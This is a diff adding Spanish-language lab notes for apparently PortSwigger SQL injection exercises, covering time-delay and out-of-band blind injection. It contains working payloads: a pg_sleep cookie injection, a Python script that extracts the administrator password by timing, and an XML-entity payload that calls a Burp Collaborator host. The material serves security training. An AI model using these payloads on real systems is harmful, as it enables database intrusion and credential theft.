@@ -302,6 +302,66 @@ lo demás será iterar hasta encontrar el resultado correcto en cada letra de `p
 
 l3w4nombeg0v2nrs90mv
 
+## Exploiting blind SQL injection by triggering time delays
 
+### Lab13: Blind SQL injection with time delays
 
-## Lab13
+Cambiar la cookie a:
+
+```sql
+QN8d4azscNQM5K9F'|| pg_sleep(10) --
+```
+
+### Lab 14: Blind SQL injection with time delays and information retrieval
+
+```python
+from pwn import log
+import requests
+abc = 'abcdefghijklmnopqrstuvwxyz0123456789'
+url = "https://acbc1f811f8fd8af802b7a9800bc00d8.web-security-academy.net/"
+
+s = requests.Session()
+password = ""
+p1 = log.progress("Password")
+p2 = log.progress("Trying")
+for p in range(20):
+    for a in abc:
+        r = s.get(url, cookies={"TrackingId":"TIM9NdKmwTUJUYxT'%3B SELECT CASE WHEN ('"+a+"'=SUBSTRING(password,"+str(p+1)+",1)) THEN pg_sleep(3) ELSE pg_sleep(0) END from users where username='administrator'--", "session":"0iw1Ot3SXZodtYvilWtYeuySiejt9iW6"})
+        p2.status("pos: "+ str(p+1)+ " letter: " + str(a)+" time: "+str(r.elapsed.total_seconds()))
+        if r.elapsed.total_seconds() > 3 :
+            password += a
+            break
+    p1.status(password)    
+p1.success(password)
+```
+
+## Exploiting blind SQL injection using out-of-band (OAST) techniques
+
+### Lab 15: Blind SQL injection with out-of-band interaction
+
+Interceptamos la consulta a la página con burp suite
+
+![sql15](sql15.png)
+
+Le damos click derecho y lo enviamos al repeter, luego abrimos el burp collaborator para sacar el dominio, entonces al repeter modificamos la cookie TrackingId con lo siguiente:
+
+```http
+UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
+```
+
+Nota: En este caso funciono el usar una injeccion para postgresql, usando lo que indica la `cheet sheet` de burp suite.
+
+Usamos el dominio que nos indique el burp collaborator y debemos codificar lo de arriba usando `ctrl+u` para que estos carateres no sean interpretados como otra cosa dentro de la cookie
+
+```http	
+' UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//5ci7n5ef8xrdtrputj0sw0emmds3gs.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
+
+se vería de la siguiente manera
+
+![sql15.1.png](sql15.1.png)
+
+verificamos que tenemos respuesta de burp collaborator
+
+![sql15.2.png](sql15.2.png)
+
